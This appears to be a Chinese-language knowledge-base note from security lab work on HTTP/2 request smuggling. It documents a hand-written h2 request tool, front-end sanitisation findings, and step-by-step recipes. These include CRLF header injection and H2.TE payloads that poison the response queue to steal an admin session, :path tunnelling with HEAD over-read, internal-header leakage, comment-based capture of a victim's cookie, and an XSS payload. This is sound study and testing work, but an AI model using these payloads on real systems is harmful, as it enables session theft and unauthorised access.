---
title: h2-smuggling-family
---
# h2-smuggling-family

HTTP/2 系请求走私/隧道(advanced 组)的帧与前端行为。件:`h2_req`(手写 h2)、
`h2cl_seq`(H2.CL 两连接 arm/follow 序列器,项目 tier)、`conn_reuse`(h1 走私)、`lab_http`。

## 件:h2_req(手写 HTTP/2)

`h2_req <url> [--method M] [--path P] [--authority H] [--header 'NAME:VALUE']...
[--hdr2 'NAME||VALUE']... [--data BODY] [--repeat N] [--no-end-stream]
[--read-ms N] [--out FILE] [--quiet]`

- TLS + ALPN `h2`;自写 preface/SETTINGS/HEADERS/DATA 帧,HPACK 用 `hpack` crate
  编/解(比 `h2` crate 强:后者用 `http::HeaderName/Value`,拒绝 CR/LF,**发不出
  注入帧**)。
- `--header` 在**第一个 `:`** 拆名值;`--hdr2` 在 **`||`** 拆,故 NAME 可含冒号/CRLF
  (要把整个请求塞进 header 名时用)。`\r\n`/`\t`/`\0` 转义展开;v1.1.0 起
  `--path`/`--method`/`--authority`/`--scheme` 也展开转义(原来只有 header/hdr2/data)。
- 响应按 stream 归并(:status/headers/body),RST_STREAM/GOAWAY 也报告。
- 首跑编译 h2/tokio-rustls/hpack。**同一个 rs 件不要并发跑**:rust-script 的 dep-info
  会在共享 cargo 缓存里互踩(并发两个 `lab_http` 报 `could not parse/generate dep
  info`),多探测用 `form_sweep`/`reqseq` 一次成包。

## 前端(SUT)行为实测(逐 lab 配置不同)

| 注入位 | lab3(CRLF 注入) | lab4(splitting) | lab5(隧道) |
| --- | --- | --- | --- |
| header **value** 带 `\r\n` | **转发**(破帧后 back-end 回 `{"error":"Invalid request"}`) | 同左(转发) | **RST_STREAM**(h2 库拒绝 value 内 CR/LF) |
| header **value** 带 `\n` | — | — | RST |
| header **NAME** 带 `\r\n` | — | — | 400 `{"error":"Invalid request"}` |
| header **NAME** 带 `\n` | — | — | 400 `{"error":"Newlines in headers are not allowed"}` |
| 重复 `Content-Length` 头 | 400 `{"error":"Only one Content-Length header should be provided"}` | — | — |

即:lab3/4 走 **value 内 CRLF**;lab5 实例上名内 CRLF/LF 均被拦(名内 CRLF→400 Invalid
request、名内 LF→明确报错);但**另一实例**(绕访问控制 tunnelling lab)对 header NAME
内 CRLF **透传**且注入请求确实执行(评论落库)——净化程度**逐实例不同**,须逐实例实测。

## 已收口:响应队列投毒 → 偷管理员 session

1. 分裂帧:`h2_req <lab4> --method GET --path / --header 'foo:bar\r\nHost: <lab>\r\n\r\nGET /admin HTTP/1.1'`
   —— value 内 `\r\n\r\n` 让 h1 back-end 把一条 h2 流拆成两个 h1 请求;第一条是外层
   `GET /`(回我们),第二条 `GET /admin` 在后端连接上执行、其响应进队列。
2. 响应队列投毒:紧随其后发一个普通请求(新连接即可,前端复用同一后端连接),
   **收到的是管理员那条响应** —— 实测回 `302 Location: /my-account?id=administrator`
   + `Set-Cookie: session=<ADMIN>`。
3. 用抓到的 session 直接 h1 打:`lab_http get <lab>/admin --jar <jar含该session>` → 200
   管理员面板;`GET /admin/delete?username=carlos` → 302;`solved_check` true。

变体(**H2.TE**,不用 header 注入而是前端把 h2 请求里的原生 `transfer-encoding: chunked`
头原样带进 h1 降级:"ambiguous length"):

`h2_req <inst> --method POST --path / --header 'transfer-encoding: chunked' --data '0\r\n\r\nGET /404probe HTTP/1.1\r\nHost: <H>\r\n\r\n'`

→ back-end 按 chunked 在 `0\r\n\r\n` 结束首请求,余下字节成为新请求;另发一个 h1 请求(新连接
即可)拿到队列里**别人的**响应,实测 `302 Location: /my-account?id=administrator`
+ `Set-Cookie: session=<ADMIN>`(管理员每 ~15s 登录一次)。

要点:投毒后**紧跟**一个请求把队列里的"他人响应"取出来;抓到的 `Set-Cookie` 就是
目标用户 session(证明响应队列投毒可直接偷会话)。

## 教程(theory,非题解)给出的帧形

- CRLF 注入:`foo: bar\r\nTransfer-Encoding: chunked`(value 内 CRLF → back-end 见两头)。
- Splitting:`foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: <site>`;注意前端把
  `:authority` 重写成 h1 `Host` 的**位置**(常追加在末尾),需把自注入的 `Host` 放在
  分裂点**前**,使两个请求都有 Host。
- 隧道(HEAD 过读):`HEAD /` + value `bar\r\n\r\nGET /tunnelled HTTP/1.1\r\nHost: ..` + `X: x`;
  前端按 HEAD 响应的 `content-length` 过读,把被隧穿响应带进 body。

## 注入位与前端约束(实测机制)

- **注入点是 `:path`,不是 header**:header 名/值含 CRLF → **RST_STREAM**,
  而 **`:path` 原样进 h1 请求行** → 隧道成立。末行用哑头吸收前端追加的 ` HTTP/1.1`:
  `h2_req <inst> --method HEAD --path '/post?postId=1 HTTP/1.1\r\nHost: <H>\r\n\r\nGET /post?postId=1 HTTP/1.1\r\nHost: <H>\r\nX: '`
- 非盲 **HEAD 过读**实测成立:本端 h2 body 里出现整段嵌套 h1 响应
  (`HTTP/1.1 200 OK…Content-Length: 8954…`),`HEAD /`(CL 8791)当过读 oracle;隧穿响应短于
  外层 CL 时前端会一直等字节(挂住)。缓存混合的关键仍是"CL 取自响应 1、body 取自响应 2"。
- 前端**严格 CL-bounded**:外层 `HEAD <path>`(CL=N)+ 注入请求,N 大于可用字节时回
  `500 Server Error: Received only X of expected N bytes`(读满才转发)→ 想让内嵌响应可读,
  要么让外层 CL ≈ 内嵌响应长度,要么再注入一个"垫片"请求把字节凑够。重开 tunnelling lab 按
  同配方打 `/admin`(伪造 `X-SSL-VERIFIED: 1` / `X-SSL-CLIENT-CN: administrator`)时 h2 层
  **未回任何 stream**(`responses: []`,55B 原始帧),与此约束一致。
- **内部头泄漏(理论页的 body 参数法)可用**:注入一条**未闭合**的 `POST /`(`search=` 结尾)
  → 前端追加的头块落进 body → 搜索页 `<h1>` 回显(~68 字符截断);用**公开评论**当存储池可拿
  全文:`Host: <lab>` / `X-SSL-VERIFIED: 0` / `X-SSL-CLIENT-CN: null` / `X-FRONTEND-KEY: 678833581`
  (疑似静态)。该前端用**客户端证书头**传递 SSL 状态;伪造它们 + 泄漏出的 key **未能**拿到
  admin(三种大小写写法、带/不带 key、让注入请求做"最后一条"吃前端当年的真 key,均 401)。
- **H2.CL 交付 gadget**:`GET /resources` → **Host 派生绝对 302** `https://<Host>/resources/`,
  配 `Host: exploit-…` 可把「302 到 exploit server」塞进队列(exploit 存 `/resources/`
  为 `alert(document.cookie)` JS)。

## 已证机制与跨 lab 要点

- **请求体"存文本"偷受害者 session 的配方(已收口 lab3)**:走私一条**未完成**的
  `POST /post/comment`(我方 Cookie+csrf,`Content-Length` 见下)→ 受害者下一次请求的字节拼上
  → 评论正文 = 受害者完整请求(含 `cookie:`)→ 直接偷 session。**CL 窗口实测**:该 app 甜点为
  1150(600 截到 `accept:`、950 差 1 字符到 session、1400 会卡住不落库)。
  见 [[lab-request-smuggling-h2-request-smuggling-via-crlf-injection]]。
- **0.CL**(理论页):前端**忽略**、后端处理 `Content-Length`;本身会**连接死锁**,需
  **early-response gadget**(后端 body 未收全先回响应)+ **双重 desync** 才能利用。
  0.CL lab 上 `:path` CRLF 注入被透传且注入请求**会执行**(评论 SMUG 落库);该实例前端
  **丢弃/重算** h2 `content-length` 头(CL:5+DATA「ab」→ 200 不挂;双 CL 无报错)⇒ H2.CL 帧不成立。
- **H2.CL lab 原语成立**:CL:0 + DATA,`--repeat 2` 时 stream3 收到 smuggled 404。
- **可用 XSS 载体(0.CL lab)**:`GET /post?postId=1` 把 User-Agent **原样**写进
  `<input type="hidden" name="userAgent" value="…">` ⇒ `"><script>alert()</script>` 直接可执行 ✓(H2.CL lab 无此面 ✗)。
- **前端普遍不复用后端连接**(0.CL、H2.CL、tunnelling 三 lab 实测):arm 后新连接 follow-up
  一律 200;`h2cl_seq`(arm 连接 A / follow 连接 B,`--graceful` 发 GOAWAY)6~4 轮 0 命中;
  arm 保持打开也 200 ⇒ 队列错位只在**同一 h2 连接内**可见,跨用户投毒的交付环拿不到
  (经典 poisoning 链断)。

## 未决面

- **跨连接交付**:H2.CL/0.CL 原语与 gadget 都在,但前端不复用后端连接
  ⇒ 响应拆分/队列投毒拿不到别人的响应;arm 后最初观测到的"h2 `content-length:0`+DATA 未被
  降级采纳(外层仍 200)"现解释为 CL 被丢弃/重算而非原语不成立。
- **缓存投毒 via 隧道**:机制全通(`:path` 注入 + HEAD 过读 + 缓存键含 query、`max-age=30`),
  但该 app 所有反射都 HTML 转义(含 `POST /post/comment` 的 `"Invalid email address: <escaped>"` JSON),拿不到裸 `<script>`;
  见 [[lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling]]。
- **绕访问控制 tunnelling lab**:名内 CRLF/LF 净化逐实例不同;伪造客户端证书头 + 泄漏的
  `X-FRONTEND-KEY` 在任意组合下仍 401(**判据未定**),CL 垫片凑字节那条路未继续。
- lab3(CRLF 注入)更早的"盗号"面:value CRLF 可转发,但注入重复 CL 被拒;盗号已由上面的
  "请求体存文本"配方收口。

## 实录溯源

- [[lab-request-smuggling-h2-request-splitting-via-crlf-injection]](splitting 已收口)、[[h2-smuggling-family]](H2.CL/0.CL/CRLF 盗号未收口)

## 相关族

- HTTP/1.1 基础组见 [[request-smuggling-family]];单包齐发见 [[race-conditions-family]]。
- 方法论:web-vuln-methods(seed 层,按名引用)。

## Links

- evidences: [[h2-frontend-sanitizer-matrix]]

## 头/正文再分类泄漏(h2→h1 降级面,2026-10-11 实证)

- 在 h2 字段(值或名)内保留行分隔字节,降级为 h1 时后端把它当头块结束,前端随后追加的内部头落入正文;正文参数回显即泄漏(实测:追加块可搬 body,信任密钥可读)。
- 已泄漏值的内层副本活在降级字节流里,不进 h2 头名消毒——是复制泄漏值,不是在头表再登记名。
- 注意:泄漏到的信任值未必是 ACL 判据(/admin 可恒 401)——读出后先验证其判据地位再投资后续链。
